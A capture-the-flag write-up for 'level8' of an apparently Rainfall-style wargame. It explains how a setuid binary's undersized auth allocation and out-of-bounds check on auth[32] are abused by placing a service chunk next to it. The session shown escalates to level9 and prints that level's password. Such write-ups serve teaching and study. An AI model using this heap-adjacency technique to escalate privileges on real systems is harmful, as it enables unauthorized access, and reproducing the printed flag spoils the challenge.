# Level8

## 1. Context

```bash
$ id
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)

$ pwd
/home/user/level8

$ ls -la
[...]
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
[...]
```

## 2. Program behavior

```bash
$ ./level8 
(nil), (nil) 

(nil), (nil)
```

We enter in a while loop, printing `(nil), (nil)` each time we press `ENTER.

## 3. Code overview

The program runs in a loop and waits for user commands.

It uses two global pointers: `auth` and `service`.

Main features :
- `auth` : allocates **4 bytes** for auth but copies up to **30 bytes** -> **heap overflow**.
- `reset` : frees `auth` but does not set it to `NULL` -> possible **use-after-free**.
- `service` : stores user input on the heap with `strdup()`.
- `login` : checks `auth[32]` (out of bounds). If this byte is non‑zero -> executes `/bin/sh`.

The program contains a **heap overflow + out-of-bounds** read that can be abused to make
`auth[32] != 0` and get a shell.

## 4. Exploit

The vulnerability is based on the following check:
```c
if (auth[32] != 0)
    system("/bin/sh");
```

However, auth is allocated with only 4 bytes:
```c
auth = malloc(4);
```

So `auth[32]` is a **read far outside the allocated buffer**.
If we manage to place **any non‑zero byte** at this location, we get a shell.

Exploit strategy :
- Use `auth ` to allocate the first chunk.
- Use `service` to allocate another chunk just after `auth `.
- Because of how the heap grows, `service` will be placed **right after** `auth `.
- By writing data in `service`, we control the memory located after `auth `.
- When the program checks `auth[32]`, it actually reads inside the `service` buffer.

So if `service` contains at least 32 bytes, `auth[32]` will be non‑zero.

## 5. Getting the flag

```bash
$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service
0x804a008, 0x804a018  // 0x804a008 + 0x10 = 0x804a018
service
0x804a008, 0x804a028  // 0x804a008 + 0x20 = 0x804a028
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

End of simulation
